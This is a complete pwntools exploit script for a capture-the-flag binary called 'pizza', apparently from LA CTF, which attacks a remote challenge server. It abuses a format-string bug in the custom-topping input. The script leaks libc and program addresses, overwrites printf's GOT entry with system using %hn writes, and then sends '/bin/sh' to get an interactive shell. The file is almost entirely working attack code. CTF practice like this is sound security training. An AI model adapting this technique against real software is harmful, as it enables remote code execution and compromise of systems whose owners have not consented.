#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("pizza_patched")
libc = ELF("libc.so.6")

context.binary = exe

host = "chall.lac.tf"
port = 31134

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp main+529
c
'''.format(**locals())

# shortcut lambda
info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

io = start()

# good luck pwning :)

menu_choice = b"> "

def CUSTOM(topping: bytes):
    sla(menu_choice, b"12")
    sa(b"Enter custom topping: ", topping)

def ANOTHER(choice: bytes):
    sa(b"Order another pizza? (y/n): ", choice)


# leak libc + code
CUSTOM(b"%47$p\n")
CUSTOM(b"%49$p\n")
CUSTOM(b"a\n")

io.recvuntil(b'Here are the toppings that you chose:\n')
leaked_libc = int(io.recvline()[:-1].decode(), 16)
diff_leaked_vs_base = 0x2724a
libc.address = leaked_libc - diff_leaked_vs_base
log.success(f"libc.address: {hex(libc.address)}")

leaked_code = int(io.recvline()[:-1].decode(), 16) # leaked main function
exe.address = leaked_code - exe.symbols['main']
log.success(f"exe.address: {hex(exe.address)}")
# end

ANOTHER(b"y\n")

# write got['printf'] = system

system_ax = libc.symbols['system'] & 0xffff
system_high_ax = (libc.symbols['system'] & 0xffff0000) >> 16

log.info(f"system: {hex(libc.symbols['system'])}")
log.info(f"system ax: {hex(system_ax)}")
log.info(f"system high ax: {hex(system_high_ax)}")

if (system_high_ax > system_ax):
    CUSTOM(b"a" * 8 + p64(exe.got['printf']) + p64(exe.got['printf']+2) + b"\n")
    smaller = system_ax
    higher = system_high_ax
else:
    CUSTOM(b"a" * 8 + p64(exe.got['printf']+2) + p64(exe.got['printf']) + b"\n")
    smaller = system_high_ax
    higher = system_ax


CUSTOM(b"%" + str(smaller).encode() + b"x%7$hn" + b"%" + str(higher-smaller).encode() + b"x%8$hn" + b"\n")
CUSTOM(b"/bin/sh\n")


io.interactive()

